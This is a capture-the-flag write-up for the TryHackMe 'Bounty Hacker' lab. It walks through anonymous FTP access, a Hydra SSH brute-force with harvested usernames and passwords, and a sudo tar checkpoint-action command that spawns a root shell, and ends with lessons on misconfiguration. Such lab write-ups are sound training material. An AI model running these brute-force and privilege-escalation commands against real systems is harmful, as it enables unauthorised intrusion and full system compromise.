# Bounty Hacker Writeup

## Room Information

**Platform:** TryHackMe  
**Room:** Bounty Hacker  
**Difficulty:** Easy  

## Objective

The objective of this room is to enumerate the target machine, discover exposed files and credentials, gain SSH access as a low-privileged user, and escalate privileges to root.

---

# Reconnaissance / Enumeration

The first step was to scan the target machine to identify open ports and running services.

```bash
nmap -sC -sV -vv MACHINE_IP
````

The scan revealed the following open ports:

* **21 (FTP)** → vsftpd 3.0.5
* **22 (SSH)** → OpenSSH 8.2p1
* **80 (HTTP)** → Apache 2.4.41

A key finding from the scan was that **anonymous FTP login was allowed**, which made FTP the most interesting service to investigate first.

---

# FTP Enumeration

Anonymous access to the FTP server was tested:

```bash
ftp MACHINE_IP
```

Login:

```bash
Name: anonymous
Password: anonymous
```

After logging in successfully, listing the files revealed two text files:

```bash
ls -la
```

Files found:

```text
locks.txt
task.txt
```

Both files were downloaded to the attacker machine:

```bash
get task.txt
get locks.txt
```

The files could also be downloaded together with:

```bash
mget *
```

---

# File Analysis

The contents of `task.txt` were:

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

This note suggested possible usernames such as:

```text
lin
vicious
```

The contents of `locks.txt` included a list of potential passwords, likely intended as a wordlist for credential attacks.

---

# Web Inspection

The website on port 80 was inspected in the browser. It displayed a simple page containing several character names:

```text
Spike
Jet
Ed
Faye
```

These names were treated as additional possible usernames.

At this point, the likely attack path was clear:

* **FTP** provided a password list
* **Web content** and `task.txt` provided possible usernames
* **SSH** was the service to attack with the gathered credentials

---

# Username Enumeration

A username list was created based on the information gathered from FTP and the website:

```bash
printf "lin\nvicious\nspike\njet\ned\nfaye\n" > users.txt
```

---

# Credential Discovery

Using the discovered usernames and the password list from `locks.txt`, a targeted SSH brute-force attack was performed:

```bash
hydra -L users.txt -P locks.txt ssh://MACHINE_IP -t 4
```

This revealed valid SSH credentials for one of the users.

---

# Initial Access (SSH)

Using the discovered credentials, SSH access was obtained:

```bash
ssh lin@MACHINE_IP
```

Login was successful, providing an initial low-privileged shell on the target machine.

---

# Privilege Escalation Enumeration

After gaining access, sudo permissions were checked:

```bash
sudo -l
```

The output showed:

```text
User lin may run the following commands on target:
    (root) /bin/tar
```

This meant that the user `lin` could run `/bin/tar` as root without unrestricted sudo access, which is a known privilege escalation path.

---

# Privilege Escalation

The `tar` binary can execute commands through checkpoint actions. Using the GTFOBins technique, a root shell was spawned:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

After running the command, a root shell was obtained.

Verification:

```bash
whoami
id
```

Output confirmed root privileges.

---

# Flag / Final Access

After escalating privileges, the root flag was located:

```bash
find / -name root.txt 2>/dev/null
```

The flag file was found under:

```text
/root/root.txt
```

It was then displayed:

```bash
cat /root/root.txt
```

The user flag could also be searched with:

```bash
find / -name user.txt 2>/dev/null
```

---

# Tools Used

* Nmap
* FTP
* Hydra
* SSH
* Sudo
* Tar
* Linux Commands

---

# Lessons Learned

This room demonstrates a simple but effective attack chain using exposed services and weak operational security.

Key techniques practiced:

* Network scanning with **Nmap**
* Anonymous **FTP** access
* Downloading exposed files from FTP
* Extracting usernames and password candidates from discovered notes
* SSH brute forcing with **Hydra**
* Initial shell access through valid SSH credentials
* Checking sudo permissions with **sudo -l**
* Privilege escalation using **tar** and the **GTFOBins** technique

This challenge highlights how anonymous file exposure, leaked credential material, and overly permissive sudo configurations can quickly lead to full system compromise.

---

